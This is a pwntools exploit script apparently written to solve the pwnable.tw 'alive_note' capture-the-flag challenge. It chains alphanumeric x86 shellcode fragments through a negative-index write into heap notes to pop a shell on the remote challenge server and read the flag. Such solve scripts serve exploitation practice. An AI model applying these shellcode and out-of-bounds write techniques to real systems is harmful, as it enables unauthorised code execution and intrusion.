from pwn import *

def add(index,name):
	p.sendlineafter("Your choice :","1")
	p.sendlineafter("Index :",str(index))
	if len(name) == 8:
		p.sendafter("Name :",name)
	else:
		p.sendlineafter("Name :",name)

'''
push eax     # P
pop  ecx     # Y, exc = heap
push 0x30    # j0
pop  eax     # X
jne  0x3b    # u9
'''
sc1 = "PYj0Xu9"

'''
push edx     # R
pop eax      # X ,eax = 0
push 0x7a    # jz
pop  edx     # Z
inc  edx     # B
jne 0x3a     # u8
'''
sc2 = "RXjzZBu8"

'''
inc  edx     # B
inc  edx     # B
inc  edx     # B
inc  edx     # B
inc  edx     # B, edx = 0x80
jne 0x3b     # u9
'''
sc3 = "BBBBBu9"

'''
xor [ecx + 0x43], edx    #1QC
xor [ecx + 0x44], edx    #1QD
jne 0x3a                 # u8
'''
sc4 = "1QC1QDu8"

'''
push 0x6c                # jl
pop  edx                 # Z
xor [ecx + 0x42], edx    #1QB
jne 0x3a                 # u8
'''
sc5 = "jlZ1QBu8"

'''
xor [ecx + 0x30], edx    #1Q0
xor [ecx + 0x34], edx    #1Q4

jne 0x3a                 # u8
'''
sc6 = "1Q01Q4u8"

'''
push eax     # P
pop  edx     # Z   edx = 0
push ecx     # Q
push eax     # P
pop  ecx     # Y   ecx = 0
pop  eax     # X   eax = heap
jne 0x3a     # u8
'''
sc7 = "PZQPYXu8"

'''
xor al, 0x30 # 40
push eax     # P
push 0x5a    # jZ
pop eax      # X
jne  0x3a    # u8
'''
sc8 = "40PjZXu8"

'''
xor al,0x51  # 4Q
'''
sc9 = "4Q" + "7M"


local = 0
if local:
	p= process("./alive_note")
else:
	p = remote("chall.pwnable.tw",10300)

add(-27, sc1)
add(0,"A1Lin")
add(0,"A1Lin")
add(0,"A1Lin")
add(0, sc2)
add(0,"A1Lin")
add(0,"A1Lin")
add(0,"A1Lin")
add(1, sc3)
add(0,"A1Lin")
add(0,"A1Lin")
add(0,"A1Lin")
add(2, sc4)
add(0,"A1Lin")
add(0,"A1Lin")
add(0,"A1Lin")
add(3,sc5)
add(0,"A1Lin")
add(0,"A1Lin")
add(0,"A1Lin")
add(4,sc6)
add(0,"A1Lin")
add(0,"A1Lin")
add(0,"A1Lin")
add(5,sc7)
add(0,"A1Lin")
add(0,"A1Lin")
add(0,"A1Lin")
add(6,sc8)
add(0,"A1Lin")
add(0,"A1Lin")
add(0,"CbinCsh")
add(7,sc9)
add(0,"A1Lin")
p.sendlineafter("Your choice :","3")
p.sendlineafter("Index :","6")
p.sendline("cat /home/alive_note/flag")
print p.recv()

p.interactive()
